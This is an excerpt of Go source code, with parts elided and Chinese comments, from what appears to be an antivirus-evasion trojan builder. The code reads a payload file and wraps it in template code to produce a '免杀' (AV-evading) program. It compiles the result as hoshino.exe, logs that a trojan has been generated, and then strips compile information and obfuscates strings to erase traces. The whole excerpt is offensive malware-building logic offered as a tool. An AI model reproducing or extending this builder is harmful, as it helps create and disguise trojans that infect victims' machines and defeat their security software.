...
`)
	...
	filedata, err := ioutil.ReadFile(options.FileName) //读取
	if err != nil {
		gologger.Fatalf("文件读取错误:%s\n", err.Error())
		return
	} else {
		gologger.Infof("读取文件%s成功.\n", options.FileName)

	}
	//创建文件夹
	os.Mkdir("zGoAvTemp", 0777)
	//组合免杀代码
	codeText := str1 + RemoveSpecialCharactar(string(filedata)) + str2
	f, err := os.OpenFile("zGoAvTemp/main.go", os.O_WRONLY|os.O_CREATE, 0600)
	if err != nil {
		panic(err)
	}
	defer f.Close()
	...
	if err := cmd.Run(); err != nil {
		//开始执行命令
		gologger.Fatalf("Go环境缺失，请安装go环境")
		return
	}
	...
	fs.Close()
	//删除文件夹
	dir, err := ioutil.ReadDir("zGoAvTemp")
	for _, d := range dir {
		os.RemoveAll(path.Join([]string{"zGoAvTemp", d.Name()}...))
	}
	os.Remove("zGoAvTemp")
	gologger.Infof("已生成木马，正在进行编译信息抹除与字符串混淆....\n")

	//消除免杀马编译信息
	cmd4 := exec.Command("go-strip.exe", "-f", "hoshino.exe", "-a"+
		"-output", "hoshinoGen.exe")
	...
	pg := pgbar.NewBar(0, "进行程序混淆与痕迹抹除：", 1000)
